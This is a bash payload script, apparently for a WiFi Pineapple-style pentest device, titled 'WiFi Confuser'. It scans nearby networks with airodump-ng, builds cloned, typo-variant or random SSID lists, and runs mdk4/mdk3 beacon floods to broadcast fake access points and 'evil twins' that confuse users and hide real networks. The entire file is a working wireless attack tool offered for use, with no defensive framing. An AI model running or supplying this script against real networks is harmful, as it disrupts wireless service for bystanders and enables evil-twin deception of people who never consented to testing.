#!/bin/bash
# Title: WiFi Confuser
# Author: bad-antics
# Description: Creates multiple fake APs with confusing/similar SSIDs
# Category: nullsec

PROMPT "WIFI CONFUSER

Creates multiple fake APs
to confuse users and hide
real networks.

Options:
- Clone nearby networks
- Typo variants
- Evil twins
- Channel flooding

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT MODE:

1. Clone All Nearby APs
2. Generate Typo Variants
3. Flood with Random SSIDs
4. Custom SSID Cloning

Enter number next screen."

MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

if [ "$MODE" -eq 2 ] || [ "$MODE" -eq 4 ]; then
    TARGET_SSID=$(TEXT_PICKER "Target SSID:" "HomeNetwork")
fi

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

COUNT=$(NUMBER_PICKER "Number of APs:" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) COUNT=10 ;; esac

resp=$(CONFIRMATION_DIALOG "Start WiFi Confuser?

Mode: $MODE
Duration: ${DURATION}s
AP Count: $COUNT

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning for targets..."
rm -f /tmp/ssid_list.txt

case $MODE in
    1) # Clone nearby
        timeout 10 airodump-ng wlan0 --write-interval 1 -w /tmp/nearby --output-format csv 2>/dev/null
        grep -oE '"[^"]+' /tmp/nearby*.csv 2>/dev/null | tr -d '"' | sort -u > /tmp/ssid_list.txt
        ;;
    2) # Typo variants
        echo "$TARGET_SSID" > /tmp/ssid_list.txt
        echo "${TARGET_SSID}Free" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}_Guest" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}-5G" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}_2.4G" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}Extended" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}_DIRECT" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}0" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}1" >> /tmp/ssid_list.txt
        echo "${TARGET_SSID}_NEW" >> /tmp/ssid_list.txt
        ;;
    3) # Random
        for i in $(seq 1 $COUNT); do
            echo "Network_$RANDOM" >> /tmp/ssid_list.txt
        done
        ;;
    4) # Custom
        echo "$TARGET_SSID" > /tmp/ssid_list.txt
        echo "$TARGET_SSID" >> /tmp/ssid_list.txt
        echo "$TARGET_SSID" >> /tmp/ssid_list.txt
        ;;
esac

SPINNER_STOP

# Use mdk3/mdk4 for beacon flood
if command -v mdk4 >/dev/null 2>&1; then
    LOG "Using mdk4..."
    mdk4 wlan0 b -f /tmp/ssid_list.txt -c 6 &
elif command -v mdk3 >/dev/null 2>&1; then
    LOG "Using mdk3..."
    mdk3 wlan0 b -f /tmp/ssid_list.txt -c 6 &
else
    ERROR_DIALOG "mdk3/mdk4 not found!"
    exit 1
fi

LOG "Flooding with SSIDs..."
sleep $DURATION

killall mdk4 mdk3 2>/dev/null

PROMPT "WIFI CONFUSER COMPLETE

Mode: $MODE
Duration: ${DURATION}s
SSIDs Broadcast: $COUNT

Press OK to exit."
